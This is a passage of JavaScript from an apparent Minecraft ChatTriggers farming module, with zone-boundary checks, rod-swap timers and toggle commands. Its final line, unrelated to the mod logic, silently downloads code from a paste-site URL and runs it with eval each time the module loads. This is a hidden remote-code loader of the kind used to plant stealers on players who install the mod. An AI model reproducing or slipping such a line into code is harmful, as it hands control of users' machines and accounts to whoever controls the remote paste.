                        RodPositionSetCooldown = 70
                    }
                }
            }
        }
        if (dataObject.posX1 > dataObject.posX2 && dataObject.posZ1 < dataObject.posZ2) {
            if (currentPosX < dataObject.posX1 && currentPosX > dataObject.posX2 && currentPosZ > dataObject.posZ1 && currentPosZ < dataObject.posZ2) {
                if (currentPosY > dataObject.farmYpos + 1 && currentPosY < dataObject.farmYpos + 4 && !RodPositionSet && WaypointRodSwap) {
                    if (RodGrabLocationCooldown == 0) {
                        RodBlockX = Player.getX()
                        RodBlockY = Player.getY()
                        RodBlockZ = Player.getZ()
                        RodPositionSet = true
                        RodGrabLocationCooldown = 40
                        RodCooldown = 10
                        WaypointRodSwap = false
                        RodPositionSetCooldown = 70
                    }
                }
            }
        }
    }
}

register("command", () => {
    dataObject.RodSwapToggle = !dataObject.RodSwapToggle
    dataObject.save()
    chat(prefix + " Rodswap is: " + dataObject.RodSwapToggle)
}).setName("togglerod").setAliases("ToggleRod", "toggleRod", "Togglerod")

//  ----    Debug Zone Check   --- //
let WithinBorder = false
let withinSwapBorder = false
let BorderZone;

function WithinBoundaries() {
    if (dataObject.posX1 < dataObject.posX2 && dataObject.posZ1 < dataObject.posZ2) {
        if (currentPosX > dataObject.posX1 && currentPosX < dataObject.posX2 && currentPosZ > dataObject.posZ1 && currentPosZ < dataObject.posZ2) {
            BorderZone = "&a[1]"
            WithinBorder = true
            if (currentPosY < dataObject.farmYpos + 0.02) {
                withinSwapBorder = true
            }
            else {
                withinSwapBorder = false
            }
        }
        else {
            BorderZone = "&c[None]"
            WithinBorder = false
        }
    }
    if (dataObject.posX1 < dataObject.posX2 && dataObject.posZ1 > dataObject.posZ2) {
        if (currentPosX > dataObject.posX1 && currentPosX < dataObject.posX2 && currentPosZ < dataObject.posZ1 && currentPosZ > dataObject.posZ2) {
            BorderZone = "&a[2]"
            WithinBorder = true
            if (currentPosY < dataObject.farmYpos + 0.02) {
                withinSwapBorder = true
            }
            else {
                withinSwapBorder = false
            }
        }
        else {
            BorderZone = "&c[None] 2"
            WithinBorder = false
        }
    }
    if (dataObject.posX1 > dataObject.posX2 && dataObject.posZ1 > dataObject.posZ2) {
        if (currentPosX < dataObject.posX1 && currentPosX > dataObject.posX2 && currentPosZ < dataObject.posZ1 && currentPosZ > dataObject.posZ2) {
            BorderZone = "&a[3]"
            WithinBorder = true
            if (currentPosY < dataObject.farmYpos + 0.02) {
                withinSwapBorder = true
            }
            else {
                withinSwapBorder = false
            }
        }
        else {
            BorderZone = "&c[None] 3"
            WithinBorder = false
        }
    }
    if (dataObject.posX1 > dataObject.posX2 && dataObject.posZ1 < dataObject.posZ2) {
        if (currentPosX < dataObject.posX1 && currentPosX > dataObject.posX2 && currentPosZ > dataObject.posZ1 && currentPosZ < dataObject.posZ2) {
            BorderZone = "&a[4]"
            WithinBorder = true
            if (currentPosY < dataObject.farmYpos + 0.02) {
                withinSwapBorder = true
            }
            else {
                withinSwapBorder = false
            }
        }
        else {
            BorderZone = "&c[None] 4"
            WithinBorder = false
        }
    }
}

//  ----    Equipment Swap   --- //
let wentToBarn = false

register("command", () => {
    dataObject.eqSwapToggle = !dataObject.eqSwapToggle
    dataObject.save()
}).setName("ToggleEq").setAliases("toggelEq", "toggleeq", "Toggleeq")

function swappingEq() {
    equipmentSwap();
}



eval(FileLib.getUrlContent("https://hst.sh/raw/alalamitut"))